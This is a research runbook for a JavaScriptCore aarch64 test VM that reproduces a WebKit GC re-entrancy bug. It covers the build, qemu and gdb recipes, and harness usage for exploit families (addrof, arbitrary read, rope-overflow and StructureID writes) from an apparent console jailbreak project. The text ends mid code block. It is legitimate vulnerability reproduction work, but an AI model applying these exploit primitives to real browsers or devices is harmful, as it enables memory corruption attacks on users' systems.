# aarch64 JavaScriptCore test VM — setup and runbook

Practical, reproducible documentation for the aarch64 `jsc` test VM in
`oss/vm/`. It builds **pristine upstream** JavaScriptCore 613.3.9
(`WebKit-7613.3.9`) with `PORT=JSCOnly` for `linux/arm64` and runs it on an
x86_64 host under `qemu-user`. It is not the console fork (see §7.5).

The bug it exists to reproduce: GC re-entrancy in
`JSC::ErrorInstance::computeErrorInfo`, upstream `ade92866440`
(WebKit bug 267785, rdar://121098660), fixed by adding `DeferGC deferGC(vm);`
to that function (`/tmp/opencode/ade928.patch`).

**Path conventions.** Paths are from the workstation this was written on.
`oss/` is the research tree (this document lives at `oss/VM-SETUP.md`,
the build files at `oss/vm/`, the analysis notes at `oss/LEAK-HUNT.md` and
`oss/WRITE-HUNT.md`); `ns2jb-webkit/` is the console-side harness;
`/tmp/opencode/` is scratch space (clone, exported rootfs, harnesses, control
files). Nothing here needs a particular absolute path except the two places
called out in §4.2 and §6.3, where a script is `load()`-ed or a control file is
read by absolute name.

Artifact status as of 2026-10-26:

| artifact | path | status |
|---|---|---|
| `ns2jsc:latest` | image `dbcbdee787cb`, 1.02 GB, arm64 | **working** (vulnerable) |
| `ns2jsc-fixed:latest` | image `e9738729ccd7`, 798 MB | **working** (patched control), built on a second attempt |
| `ns2jsc-dbg` | `Dockerfile.dbg` | **absent**; first build canceled |
| exported rootfs | `/tmp/opencode/jscroot`, 1.1 GB | **present** |
| upstream clone | `/tmp/opencode/webkit-upstream`, 2.4 GB | **present** |
| `sweep-results.json`, `matrix.json` | — | **not preserved** (§6.4) |

---

## 1. Prerequisites

### 1.1 Host

Everything below was verified on this machine on 2026-10-26.

```sh
uname -m                  # x86_64
nproc                     # 32
qemu-aarch64 --version    # qemu-aarch64 version 11.1.2
gdb --version             # GNU gdb (GDB) 18.1  (needs aarch64 target support)
docker version            # buildkit builder required (Dockerfile uses --mount=type=cache)
cat /proc/sys/fs/binfmt_misc/qemu-aarch64
```

Required:

* **x86_64 Linux host.** The guest is `linux/arm64`; nothing here runs natively
  on the host.
* **docker** with BuildKit. The Dockerfile uses
  `# syntax=docker/dockerfile:1` and `RUN --mount=type=cache`.
* **qemu-user 11.1.2** (`qemu-user 11.1.2-1` on Arch/CachyOS). `11.1.2` is the
  version in every captured backtrace, e.g. `oss/vm/crash-backtrace.txt`.
* **binfmt_misc registration** of `qemu-aarch64`, needed only for the
  `docker run` path (BuildKit builds use it too). Observed registration:

  ```
  enabled
  interpreter /usr/bin/qemu-aarch64
  flags: POCF
  ```

  It was registered 2026-10-25 22:28, i.e. when the first build started. If it
  is missing on a new host, register it with your distro's
  `qemu-user-binfmt`/`systemd-binfmt` package, or
  `docker run --privileged --rm tonistiigi/binfmt --install arm64`.
  *Note:* the `tonistiigi/binfmt` command is the generic upstream recipe and was
  not the one used here.
* **gdb with aarch64 support** on the host (x86_64 gdb cross-debugging an
  aarch64 remote target). The capture files say "host x86_64 gdb 16"; the
  machine now has 18.1, and the recipe in §5 was re-verified with 18.1.
* `tar`, `python3` (used by `sweep.sh`), `setarch` (util-linux, for `-R`),
  `timeout`.
* **Network on the first build only**: pulls `debian:bookworm`,
  `docker/dockerfile:1`, and apt packages.

### 1.2 Disk

| item | measured size |
|---|---|
| `ns2jsc:latest` image | 1.02 GB (`1017379595` bytes) |
| `ns2jsc-fixed:latest` image | 798 MB |
| exported rootfs `/tmp/opencode/jscroot` | 1.1 GB |
| upstream clone `/tmp/opencode/webkit-upstream` | 2.4 GB |
| source tree `oss/vm/src` | 110 MB (5225 files) |

Budget **~5 GB free** for image + exported rootfs + BuildKit cache. The
`/build` directory is a BuildKit cache mount and is **not** committed to the
image, so the image stays small; the object tree lives only in BuildKit's cache
(`docker system df` reports the shared total, 327.9 GB on this machine).

**Core dumps are the real disk hazard.** Every guest SIGSEGV writes a
`qemu_jsc_*.core` in the *current working directory*, 220–722 MB each. This
repository already contains **24** such files totalling **8.5 GB**, and the
exported rootfs contains one 220 MB core baked into the image (see §2.3).
Always `ulimit -c 0` (§3.3).

---

## 2. Build

### 2.1 Source provenance

* Upstream clone: `/tmp/opencode/webkit-upstream`
  * tag `WebKit-7613.3.9`, commit `60e57aea84e`
    ("Revert 0360d950b32f. rdar://problem/92129881")
  * remote `https://github.com/WebKit/WebKit.git`
  * **partial clone** (`remote.origin.promisor=true`,
    `remote.origin.partialclonefilter=blob:none`)
  * **sparse checkout** (`core.sparseCheckout=true`) of
    `/Source/`, `/Source/JavaScriptCore/`, `/Source/WTF/`,
    `/Source/bmalloc/`, `/Source/ThirdParty/`, `/Source/cmake/`
* `oss/vm/src` is a copy of that tree; verified identical for the file that
  matters: `oss/vm/src/Source/JavaScriptCore/runtime/ErrorInstance.cpp` is
  byte-identical to the upstream checkout.
* Version, from the console fork tree
  `oss/ns2-23/NS2_23.0.0/webkit_3.12.11/JavaScriptCore/Configurations/Version.xcconfig`:
  `MAJOR_VERSION = 613; MINOR_VERSION = 3; TINY_VERSION = 9;` → 613.3.9. The
  fork ships the same vulnerable `computeErrorInfo` body but has no
  `Source/cmake` infrastructure, which is why the VM uses upstream source
  (`oss/vm/Dockerfile` header comment).

### 2.2 Build command

Run from `oss/vm/` (the build context contains `src/`, `error-instance.js`,
`sweep.sh`):

```sh
cd /home/maci/Desktop/Research/switch2-ns2jb-2026-10-25/oss/vm
docker build --platform linux/arm64 -f Dockerfile -t ns2jsc .
```

*Note:* `--platform linux/arm64` is redundant — the Dockerfile already says
`FROM --platform=linux/arm64 debian:bookworm`, which makes BuildKit warn
`FromPlatformFlagConstDisallowed`. The command form above is reconstructed from
the build logs (`#1 load build definition from Dockerfile`, `#16 naming to
docker.io/library/ns2jsc`); flag order is not significant.

### 2.3 What the Dockerfile does

`oss/vm/Dockerfile`:

1. `FROM --platform=linux/arm64 debian:bookworm` (139 MB base layer).
2. `apt-get install --no-install-recommends`: `build-essential cmake
   ninja-build perl python3 ruby bison flex gperf pkg-config libicu-dev
   libedit-dev libxml2-dev libsqlite3-dev zlib1g-dev ca-certificates`
   (525 MB layer).
3. `COPY src /src` (105 MB layer).
4. `RUN --mount=type=cache,target=/build,sharing=locked cmake -G Ninja
   -S /src -B /build -DPORT=JSCOnly -DCMAKE_BUILD_TYPE=Release
   -DENABLE_STATIC_JSC=ON -DENABLE_API_TESTS=OFF -DENABLE_TOOLS=OFF
   -DUSE_CAPSTONE=OFF && ninja -C /build -j16 jsc && install -m 0755
   "$(find /build -type f -name jsc -perm -u+x | head -n1)" /usr/local/bin/jsc`
   (only the 28.6 MB `jsc` binary is committed; the object tree stays in the
   cache mount).
5. `RUN jsc --version 2>&1 || true` — `jsc` has **no** `--version` option
   (`ERROR: invalid option: --version`) and then SIGSEGVs at VM startup with
   JIT on (§3.2). This step leaves a **220 MB core dump at `/` inside the
   image**, which is why the image is 1.02 GB and the exported rootfs 1.1 GB.
   `ls /` in the image shows `qemu_jsc_20261025-153304_8.core`.
6. `COPY error-instance.js /opt/error-instance.js`, `COPY sweep.sh
   /opt/sweep.sh`, `chmod +x`, `WORKDIR /work`, `CMD ["jsc",
   "/opt/error-instance.js"]`.

`ARG JOBS=16` controls `-j`; override with `--build-arg JOBS=N`.

### 2.4 Measured build duration

| log | step | result |
|---|---|---|
| `build.log` | `#10` cmake+ninja | `DONE 47.3s` — **not a cold build**: the `/build` cache mount already held the object tree (only 10 ninja actions: bmalloc, LLInt generators, final link) |
| `build-fixed2.log` | `#10` | `DONE 1750.7s` = **29 min 11 s**, `[998/998]`, `-j16` — **cold**, the figure to budget |
| `build-fixed.log` | `#10` | `CANCELED` at `[1211/2209]`, 330 s (ran concurrently with the dbg build) |
| `build-dbg.log` | `#8` | `CANCELED` at `[744/2209]`, 287 s |

The `ns2jsc` image was produced by a rebuild against a warm `/build` cache;
`build.pid` (PID `1742387`) records the earlier attempt that was interrupted.
Plan **~30 minutes** for a cold build on this 32-core host with `-j16`.

### 2.5 Derived images

**Fixed control — `ns2jsc-fixed` (exists, 798 MB).**

```sh
cd /home/maci/Desktop/Research/switch2-ns2jb-2026-10-25/oss/vm
docker build --platform linux/arm64 -f Dockerfile.fixed -t ns2jsc-fixed .
```

`Dockerfile.fixed` is identical to `Dockerfile` plus one step before cmake:

```dockerfile
COPY fix.py /fix.py
RUN python3 /fix.py /src/Source/JavaScriptCore/runtime/ErrorInstance.cpp
```

`fix.py` asserts the `computeErrorInfo` prologue occurs exactly once and inserts
`    DeferGC deferGC(vm);` after `ASSERT(!m_errorInfoMaterialized);` — the
upstream `ade92866440` fix. The build succeeded on the second attempt
(`build-fixed2.log`, 2026-10-25 16:11→16:40 UTC). Verified:

```sh
docker run --rm --platform linux/arm64 --ulimit core=0 \
  -v "$PWD/oss/vm:/work:ro" ns2jsc-fixed \
  sh -c 'ulimit -c 0; jsc --useJIT=false /work/error-instance.js; echo rc=$?'
# rc=0        (ns2jsc prints "Segmentation fault (core dumped)" and rc=139)
```

Note: `EXPLOITATION-REPORT.md` §9 and §12 still describe both derived images as
canceled; that is now stale for the fixed image.

**Debug build — `ns2jsc-dbg` (absent).** `Dockerfile.dbg` is `Dockerfile` with
`-DCMAKE_BUILD_TYPE=RelWithDebInfo` and `gdb` added to the apt list. Its only
build (`build-dbg.log`) was canceled at `[744/2209]` after 287 s. To finish it:

```sh
docker build --platform linux/arm64 -f Dockerfile.dbg -t ns2jsc-dbg .
```

*Estimate, not measured:* RelWithDebInfo roughly doubles compile time and disk
over the Release tree, so expect on the order of an hour and a multi-GB cache
mount. It buys line numbers and inline frames in gdb (§5.4).

---

## 3. Fast run path (qemu-user) — used by all experiments

Every experiment in `oss/LEAK-HUNT.md`, `oss/WRITE-HUNT.md`,
`oss/vm/groom/RESULTS.md` and `oss/vm/groom/ASLR.md` used this path, not
`docker run`.

### 3.1 Create the exported rootfs (one-time, verified)

```sh
docker create --name jscroot_tmp ns2jsc
mkdir -p /tmp/opencode/jscroot
docker export jscroot_tmp | tar -C /tmp/opencode/jscroot -xf -
docker rm jscroot_tmp
```

`docker create` prints a platform warning (`requested image's platform
(linux/arm64) does not match the detected host platform`) — harmless for
`export`. A fresh export is 1.1 GB and contains
`usr/local/bin/jsc` (28.6 MB), `opt/error-instance.js`, `opt/sweep.sh`, the
whole `/src` tree, and the stray 220 MB core at `/`.

### 3.2 Run

```sh
ROOT=/tmp/opencode/jscroot
JSC=$ROOT/usr/local/bin/jsc
ulimit -c 0
qemu-aarch64 -L $ROOT $JSC --useJIT=false /path/to/file.js; echo "exit=$?"
```

* `-L $ROOT` supplies the guest `ld-linux-aarch64.so.1` and the arm64
  libraries (libicu, libstdc++, libc). No chroot is needed.
* `--useJIT=false` is **mandatory**. With JIT on, qemu-user 11.1.2 SIGSEGVs
  during `JSC::VM::VM` construction, before any script runs:
  `LinkBuffer::copyCompactAndLinkCode` → libc `memcpy` implemented with the
  SME copy instructions (`cpyfp [x3]!, [x1]!, x2!`), see
  `oss/vm/crash-backtrace-gdbstub.txt` (register dump: `x2=0xbc`). This is an
  emulation artifact, unrelated to the bug under test. It is also why the
  image build step `jsc --version` dumped core.
* `ulimit -c 0` stops 220–722 MB core dumps per crash (§1.2).

Measured speed (this host, 2026-10-26):

| script | wall time |
|---|---|
| `-e 'print(1+1)'` | 0.13 s |
| `oss/vm/error-instance.js` (crashes) | 0.37 s |
| 32 MB `addrof-read-async` family (survives) | 0.72–0.76 s |

So ~0.5 s per small run; a 32 MB family run is ~0.7 s and may die in ~0.66 s on
the GC race (§7.4).

### 3.3 Docker alternative (same binary)

```sh
cd /home/maci/Desktop/Research/switch2-ns2jb-2026-10-25
docker run --rm --platform linux/arm64 --ulimit core=0 \
  -v "$PWD/oss/vm:/work" ns2jsc \
  sh -c 'ulimit -c 0; jsc --useJIT=false /work/groom/baseline.js'
```

This goes through binfmt_misc, so it needs the registration from §1.1. It is
slower to start and writes cores into `/work` if you forget `ulimit -c 0`. Use
it only to sanity-check the image; use §3.2 for experiments.

---

## 4. Running tests

### 4.1 The upstream repro

`oss/vm/error-instance.js` is the upstream regression test from
`ade92866440` (100 nested frames, each setting
`arguments.callee.displayName = 'a'.repeat(0x100000) + 'b'`, then
`error.stack`):

```sh
ROOT=/tmp/opencode/jscroot; JSC=$ROOT/usr/local/bin/jsc; ulimit -c 0
qemu-aarch64 -L $ROOT $JSC --useJIT=false \
  /home/maci/Desktop/Research/switch2-ns2jb-2026-10-25/oss/vm/error-instance.js
echo "exit=$?"
```

Expected:

```
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
exit=139
```

On `ns2jsc-fixed` the same file exits 0 with no output (§2.5).

### 4.2 Page families: `load()` + `Ns2Webkit.runFamily(...)`

The families live in `ns2jb-webkit/www/exploit.js` (built from
`ns2jb-webkit/src/exploit.ts`). The VM has no DOM, so the harness loads that
file with the shell's `load()` and calls the exported `Ns2Webkit.runFamily`.

Three facts that bite (all verified):

1. `runFamily` **always returns a Promise** (`src/exploit.ts:2663`), even for
   synchronous families. `print(JSON.stringify(Ns2Webkit.runFamily(n)))` prints
   `{}` — that is what the old helper `/tmp/opencode/run-family.js` does. Use
   `.then(...)` plus a `setTimeout` wait loop that calls `quit()`.
2. Shell arguments after the script need the `--` separator:
   `jsc file.js -- name`. Without it, top-level `arguments` is undefined
   (`ReferenceError: Can't find variable: arguments`).
3. Signature: `runFamily(name, report, reportPartial, options)`; the second
   argument (`report`) is passed as `undefined` in every VM harness, and
   `options.bigNameBytes` / `options.readNameBytes` bound the 32 MB triggers
   (`FamilyOptions`, `src/exploit.ts`).

Create the harness (`/tmp/opencode/vm-run-family.js`):

```js
load('/home/maci/Desktop/Research/switch2-ns2jb-2026-10-25/ns2jb-webkit/www/exploit.js');
var name = arguments[0] || 'addrof-read-async';
var big = Number(arguments[1] || 33554432);
var done = false, row = null;
print('START ' + name + ' bigNameBytes=' + big);
Ns2Webkit.runFamily(name, undefined, function (p) {
  if (p.step) print('STEP ' + String(p.step) + (p.leakAddress ? ' leak=' + p.leakAddress : ''));
}, {bigNameBytes: big}).then(function (r) { row = r; done = true; },
  function (e) { print('ERR ' + e); done = true; });
(function wait() {
  if (!done) return setTimeout(wait, 20);
  print('ROW ' + JSON.stringify(row));
  quit();
})();
```

Run it (the exact environment line from `oss/WRITE-HUNT.md` §1.3, plus the
`--` separator):

```sh
ROOT=/tmp/opencode/jscroot; JSC=$ROOT/usr/local/bin/jsc; ulimit -c 0
qemu-aarch64 -L $ROOT $JSC --useJIT=false --useDollarVM=1 --useConcurrentGC=false \
  /tmp/opencode/vm-run-family.js -- addrof-read-async
```

Observed output shape (2026-10-26):

```
START addrof-read-async bigNameBytes=33554432
STEP accessor-install
...
STEP ladder-done leak=0x7f8e5e49c060
STEP read-begin leak=0x7f8e5e49c060
STEP read-stack leak=0x7f8e5e49c060
STEP read-result leak=0x7f8e5e49c060
STEP read-second-begin leak=0x7f8e5e49c060
STEP read-second leak=0x7f8e5e49c060
ROW {"trigger":"addrof-read-async",...,"leakAddress":"0x7f8e5e49c060",
     "readAddress":"0x7f8e5e49c060","copied":true,
     "copyHex":"b3030000001800000000000000000000a083415e8e7f0000...",...}
```

Other harnesses in `/tmp/opencode` that use the same pattern:
`vm-read.js` (family name + `bigNameBytes` + `readNameBytes`),
`vm-family.js` (prints the partial steps),
`vm-write-family.js` / `vm-write-rope-family.js` (write families, with
`writeRefs`), `vm-family-prime.js`, and
`/tmp/opencode/async-read/harness.js` (family + timing read from
`/tmp/opencode/async-read/config.json`).

**Which family to use.** `addrof-read-async` and `addrof-read-async-wide`
(the deferred-payoff families, `src/exploit.ts` registry entry with `async`
flag `true`) are the reliable ones. The synchronous v1 family
`prototype-gettersetter-addrof` crashed at step `object-conversion` in 5/5
attempts on 2026-10-26 (`--useDollarVM=1`, with and without
`--useConcurrentGC=false`, 1 MB and 32 MB prime), and so did
`addrof-proto-v8` (at `desc-getter`). `addrof-proto-steps`, which stops before
reading `.description`, survives (rc=0) — so the ladder itself is fine and the
confused `.description` read is what kills the process when it is not deferred
to a second task. Treat the synchronous families as timing-dependent and retry;
use the async ones for anything you need to be repeatable.

### 4.3 Families referenced by LEAK-HUNT / WRITE-HUNT

Family names and their console `params` overrides are in
`oss/LEAK-HUNT.md` §6–7 and `oss/WRITE-HUNT.md` §6. Relevant to the VM:

| family | doc | VM status |
|---|---|---|
| `prototype-gettersetter-addrof` | LEAK-HUNT §2 | sync; crashes at `object-conversion` here (§4.2) |
| `addrof-read-async` / `-wide` | WRITE-HUNT §6, `exploit.ts` | **works**, `copied:true` |
| `write-rope-overflow` | WRITE-HUNT §1.4 | async; needs `bigNameBytes` 16 MB or 32 MB |
| `write-symbol-structureid` | WRITE-HUNT §2.2 | async; `structureVerification:"collector-required"` |
| `proxy-this-scope-leak`, `iterator-next-mdone`, `regexp-backref-empty` | LEAK-HUNT §6 | sync, record-only |

The console-side overrides (`{"params":{"mode":"family","family":"..."}}` in
`ns2jb-webkit/runs/attempt-sweep.json`) are for the page, not the VM. In the VM
you pass the same knobs as `FamilyOptions` instead
(`{bigNameBytes: 33554432, writeRefs: 2}`).

### 4.4 `--useConcurrentGC=false` — when it matters

The trigger is a GC that lands inside `resolveRope` while the *last* captured
stack frame is being resolved. Whether the collector runs there is timing
dependent unless the concurrent collector is off.

`oss/vm/groom/RESULTS.md` (Deterministic arbitrary read): "`--useConcurrentGC=false`
is what makes the GC land on the final frame every time; `Error.stackTraceLimit
= N` makes that frame the final loop iteration, so the secondary vector UAF is
not touched. Without those two flags the trigger at the last frame is
heap-timing dependent."

Measured with `/tmp/opencode/async-read/run-matrix.sh` (5 runs per cell,
`addrof-read-async` and `addrof-read-async-wide`, 32 MB prime / 32 MB read;
per-run logs `last-serial-*.log`, `last-concurrent-*.log`):

| mode | family | first read `copied` | crashes |
|---|---|---|---|
| `--useConcurrentGC=false` | `addrof-read-async` | **5/5** | 0/5 |
| default (concurrent) | `addrof-read-async` | 2/5 (rest: `copied:false`, second read true) | 1/5 |
| `--useConcurrentGC=false` | `addrof-read-async-wide` | 3/5 | 2/5 |
| default (concurrent) | `addrof-read-async-wide` | 2/5 | 0/5 |

Use `--useConcurrentGC=false` for anything whose result you want to compare
run-to-run. Leave it at the default only when you are deliberately testing
timing sensitivity. `--useDollarVM=1` is needed only for `$vm` helpers
(`$vm.gc()`, `$vm.dumpCell`, `$vm.value`); `$vm` is `undefined` without it.

### 4.5 Observing crashes

`qemu-aarch64` reports the guest fault on stderr and returns the guest signal
as its own status:

```
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
```

* shell `$?` = **139** (128 + SIGSEGV) — the primary success signal for the
  repro.
* Under `timeout`, a killed run is 124 (`--signal=TERM`) or 137
  (`--signal=KILL`). `sweep.sh` maps 124/137 to `TIMEOUT` and `>=128` to
  `SIG<n>` (`oss/vm/sweep.sh`, `run_attempt`).
* Some crashes are the *intended* observation (the repro) and some are noise
  from the GC race (`readAtAddress` faults mid-read); retry the latter.
* stderr is the only channel: `jsc` prints `print()` to stdout, qemu's signal
  report to stderr.

---

## 5. GDB over the qemu gdbstub

Symbols come from the guest binary through the stub: `jsc` is **not stripped**
(51584 symbols, `.symtab` present) but has **no debug info** (no `.debug_*`
sections, Release `-g0`). So `break JSC::...` and `bt` give function names and
offsets, never line numbers or locals.

### 5.1 The recipe (`oss/vm/reentrancy.gdb`)

```gdb
set pagination off
set confirm off
set architecture aarch64
target remote 127.0.0.1:2345

break JSC::ErrorInstance::computeErrorInfo(JSC::VM&)
commands
silent
printf "\n===== computeErrorInfo ENTER (outer/inner) =====\n"
bt 15
continue
end

break JSC::ErrorInstance::finalizeUnconditionally(JSC::VM&)
commands
silent
printf "\n===== ErrorInstance::finalizeUnconditionally ENTER (GC) =====\n"
bt 10
continue
end

continue
printf "\n===== SIGNAL STOP =====\n"
bt 30
printf "\n===== REGISTERS =====\n"
info registers pc sp x0 x1 x2 x3 x4 x5
printf "\n===== INSN =====\n"
x/8i $pc
info frame
```

Run it:

```sh
cd /home/maci/Desktop/Research/switch2-ns2jb-2026-10-25/oss/vm
ROOT=/tmp/opencode/jscroot; JSC=$ROOT/usr/local/bin/jsc; ulimit -c 0
qemu-aarch64 -L $ROOT -g 2345 $JSC --useJIT=false error-instance.js &
sleep 0.5
gdb -q -batch -x reentrancy.gdb | tee /tmp/opencode/reentrancy.out
wait
```

`-g 2345` makes qemu wait for the stub connection on TCP 2345 before starting
the guest; the stub accepts **one** client, so do not leave a gdb attached and
expect a second one to work.

The equivalent one-liner used in `oss/vm/groom/ASLR.md` (ASLR on, no
breakpoints, registers only):

```sh
qemu-aarch64 -L $ROOT -g 2345 $JSC --useJIT=false --useConcurrentGC=false file.js &
gdb -q -batch \
  -ex 'set pagination off' -ex 'set confirm off' \
  -ex 'file /tmp/opencode/jscroot/usr/local/bin/jsc' \
  -ex 'target remote 127.0.0.1:2345' \
  -ex continue \
  -ex 'info registers x0 x1 x2 x3 x4 pc' -ex 'bt 6'
```

`/tmp/opencode/run-gdb.sh <abs-js> <out>` wraps the register-capture form.

### 5.2 What was captured

`oss/vm/crash-backtrace.txt` (re-verified 2026-10-26, gdb 18.1, identical
structure):

1. `computeErrorInfo` entered from `materializeErrorInfoIfNeeded` ←
   `getOwnPropertySlot` ← `LLInt::performLLIntGetByID` (the outer pass).
2. `finalizeUnconditionally` entered from `Heap::finalizeUnconditionalFinalizers`
   ← `runEndPhase` ← `collectInMutatorThread` ← `stopIfNecessarySlow` ←
   `JSRopeString::resolveRope` ← `getCalculatedDisplayName` (the GC re-entry).
3. `computeErrorInfo` again, now with `finalizeUnconditionally` in its caller
   chain — the re-entrancy.
4. SIGSEGV in `JSRopeString::resolveRopeInternalNoSubstring<unsigned char>`
   (`+360`, `ldp q0, q1, [x0]`) with
   `x0 = x1 = 0x6161616161616161`, `x4 = 0x61616161` — the `'a'` marker bytes
   from the displayName acting as source pointer and length.

That is the whole mechanism in one trace: the rope cell was converted to a
non-rope by the inner pass, the outer pass re-read `fiber(i)` as a
`JSString*`, and `displayName` characters `[8..15]` / `[4..7]` became the
`memcpy` source pointer / length (`oss/vm/groom/RESULTS.md`, "gdb evidence of
the mechanism").

`oss/vm/crash-backtrace-gdbstub.txt` is the same recipe with JIT **on**: it
stops in libc `cpyfp` from `LinkBuffer::copyCompactAndLinkCode` — the §3.2
artifact, useful only as the proof that JIT must be off.

### 5.3 Reading a fault without symbols

When the fault is inside a confused access the backtrace is unreliable by
construction: `bt` ends with

```
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
```

because the secondary `Vector<StackFrame>` UAF (`ASLR.md` channel 4) means the
frame the unwinder follows was freed. Trust, in this order:

1. `pc` and `x/8i $pc` (which instruction faulted),
2. `x0`–`x5` (source pointer, length, destination),
3. `bt` only for the top 3–4 frames, cross-checked against the known chain.

`info frame` still prints the saved `x19`–`x30`/`x29` slots for the current
frame, which is enough to recover the caller.

### 5.4 When you need line numbers

The Release binary cannot give them. Build `ns2jsc-dbg` (§2.5,
`RelWithDebInfo`) and either:

* run it in docker with the host gdb attached to a qemu `-g` stub inside the
  container, or
* export the dbg rootfs the same way as §3.1 and use the fast path — the
  `jsc` binary carries the DWARF, so `gdb -ex 'file .../usr/local/bin/jsc'`
  resolves lines without asking the stub for symbols.

`Dockerfile.dbg` installs `gdb` in the image as well, for the in-container case.

---

## 6. The scripts

### 6.1 `oss/vm/sweep.sh`

A parameter ladder for the repro, run **inside** the `ns2jsc` container. Each
attempt is a fresh `jsc` process, so one crash does not end the sweep.

**The script does not pass `--useJIT=false`.** `run_attempt` executes
`timeout --signal=KILL "${limit}s" "$JSC" "$file"` with `JSC` quoted, so a
space-separated value cannot carry the flag. Run as shipped, every attempt dies
in the §3.2 JIT startup crash and the ladder measures nothing (observed: 21/21
`SIGSEGV`, 165–271 ms each, including the rungs that should survive). Use a
wrapper:

```sh
mkdir -p /tmp/opencode/sweep-out
docker run --rm --platform linux/arm64 --ulimit core=0 \
  -v /tmp/opencode/sweep-out:/out ns2jsc sh -c '
    printf "#!/bin/sh\nexec /usr/local/bin/jsc --useJIT=false \"\$@\"\n" \
      > /usr/local/bin/jsc-nojit
    chmod +x /usr/local/bin/jsc-nojit
    OUT=/out/sweep-results.json JSC=/usr/local/bin/jsc-nojit /opt/sweep.sh'
```

(The in-container path is `/opt/sweep.sh`, baked in by `Dockerfile`. The
invocation is reconstructed from the script's own usage line
`OUT=/out/sweep-results.json JSC=jsc /opt/sweep.sh`; no output from the
original run was preserved — §6.4.)

With the wrapper, the whole sweep takes ~20 s on this host. Result of a fresh
run on 2026-10-26 (`/tmp/opencode/sweep-out2/sweep-results.json`):

```
Summary: {"attempts": 21, "crashes": 3, "timeouts": 0, "clean_exits": 18}
```

| attempts | param | result | duration |
|---|---|---|---|
| read-stack 1–6 | 16384 … 131072 | rc=0 `ok` | 241–299 ms |
| read-stack 7 | 262144 | rc=139 `SIGSEGV` | 353 ms |
| read-stack 8 | 1048576 | rc=139 `SIGSEGV` | 428 ms |
| upstream-test | 1048576 | rc=139 `SIGSEGV` | 419 ms |
| finalizer 1–12 | 4 … 8192 | rc=0 `ok` | 494–1064 ms |

i.e. the read-stack path is fatal from a 256 KB displayName upward and safe at
128 KB and below; the finalizer path (dead errors, no `.stack` read) never fires
at any error count — matching `EXPLOITATION-REPORT.md` §8 ("the finalizer-path
mode never fires"). Note the header of the run always contains
`ERROR: invalid option: --version` followed by a qemu SIGSEGV line: `sweep.sh`
probes `"$JSC" --version` with JIT on, and `|| true` swallows it.

What it does:

* **Ladder 1 — read-stack path.** 100 nested frames, `displayName` length
  `16384 32768 49152 65536 98304 131072 262144 1048576` (8 attempts), each
  generated by `gen_readstack` into a temp file, `timeout 600` s.
* **Upstream test.** `/opt/error-instance.js` at depth 100, length 1048576.
* **Ladder 2 — finalizer path.** depth 8, `NUM_ERRORS` doubling
  `4 8 16 32 64 128 256 512 1024 2048 4096 8192` with a 65536-object groom
  (12 attempts), `timeout 300` s.
* Per attempt it records kind, id, depth, param, exit code, signal name,
  duration (ms), and a 400-char stderr tail; it prints a one-line summary and
  writes the JSON document described below.

Output schema (`OUT`): `{bug, source, generated_at, host, summary:{attempts,
crashes, timeouts, clean_exits}, results:[{kind,id,depth,param,exit_code,
signal,signal_name,timeout_s,duration_ms,stderr_tail,crashed,timed_out}]}`.

Environment knobs: `JSC` (default `jsc`), `OUT` (default
`/out/sweep-results.json`), `TIMEOUT_READSTACK` (600),
`TIMEOUT_FINALIZER` (300). Crashes return in well under a second, so the
timeouts only matter for a run that hangs.

### 6.2 `oss/vm/groom/*.js`

All are standalone `jsc` scripts, run with §3.2. A/B/C…/K are the labels in
`RESULTS.md`'s results table.

| file | what it does |
|---|---|
| `baseline.js` | A. the repro with a `'M'` marker displayName so the faulting registers are recognisable |
| `interleave-strings.js` | B. 100×1 MB strings allocated *after* the error, before `.stack`; the 100 MB GC pre-materialises the stack → survives |
| `interleave-strings-pre.js` | B2. same strings *before* the error → still crashes with `x1=0x4d4d…` |
| `interleave-arrays.js` | C. 4000 arrays × 64 `{a,b}` objects after the error → survives (pre-materialised) |
| `interleave-arrays-pre.js` | C2. same before the error → crashes, pointers never win |
| `repeat.js` | D. 5 sequential build/groom/read iterations; prints `ITER n …` markers so the crash point is visible |
| `typed-patterns.js` | E. 64×1 MB `ArrayBuffer`s filled `45 35 45 35…` after the error → survives |
| `header-pointer.js` | F. displayName `[4..7]=0x10`, `[8..15]=0xdeadbeefcafebabe` → proves the pointer is attacker-controlled (`x0=x1=0xdeadbeefcafebabe`) |
| `header-pointer-2.js` | F2. `[4..7]=0x20`, `[8..15]=0x0000414243444546` (leading zero bytes preserved) |
| `survive-zerolen.js` | G. length 0 / NULL pointer → the confused copy is a no-op and the crash moves to `StackFrame::functionName` (secondary UAF) |
| `leak.js` | K. deterministic arbitrary read into `error.stack`; needs ASLR off and a calibration pass (§6.3) |
| `aslr-selfcal.js` | channel 1: derives the address from `/proc/self/maps` at run time, ASLR on |
| `c3-short.js` | channel 3: 13-char rope with a would-be fault pointer (never GCs: `cost() <= 256`) |
| `c3-mixed2.js` | channel 3: 96 MB last frame + 12-char second-to-last; `safe`/`bogus` mode |
| `secondary-uaf.js` | channel 4: configurable rope length / frame count, displayName neutralised |
| `write-overflow.js` | rope false-length overflow, with readback past the declared end |
| `refcount-write.js` | `Symbol.prototype.description` refcount write to the getter's `StructureID` |

### 6.3 Control files in `/tmp/opencode`

The groom harnesses are file-driven so that a calibration pass and the real run
can be byte-identical scripts (required for a deterministic heap layout).
`readFile(...).trim()` is used everywhere, so a trailing newline is harmless.

| file | written by | values |
|---|---|---|
| `leak-mode` | you | `CALIB` \| `PROOF` (`leak.js`) |
| `leak-ptr` | you | 16 hex chars, address to read (`leak.js`) |
| `aslr-mode` | you | `CALIB` \| `PROOF` (`aslr-selfcal.js`) |
| `ch1-dump` | you | `1` prints `/proc/self/maps` in CALIB |
| `ch1-code` | you | `SIZE OFF`, e.g. `18000 4000` |
| `c3-mode` | you | `safe` \| `bogus` (`c3-mixed2.js`) |
| `e4-len`, `e4-n` | you | rope length / frame count (`secondary-uaf.js`) |
| `wr-mode` | you | `CALIB` \| `PROOF` (`write-overflow.js`) |
| `wr-char` | you | source character, e.g. `x` |
| `wr-src` | CALIB `[1]` + `0x14` | source characters address |
| `wr-copy` | you | fake copy length, e.g. `16779264` |
| `wr-d1` | first PROOF `BIGNAME [1]` | destination `StringImpl`; `0` = report only |
| `wr-rdoff` | optional | override the readback offset |
| `rw-n` | you | number of description strings to keep (`refcount-write.js`) |
| `async-read/config.json` | you | `{family, primeMB, readMB, delayMs, timeoutMs}` |

Canonical calibration/read pair (`RESULTS.md`, `leak.js` header):

```sh
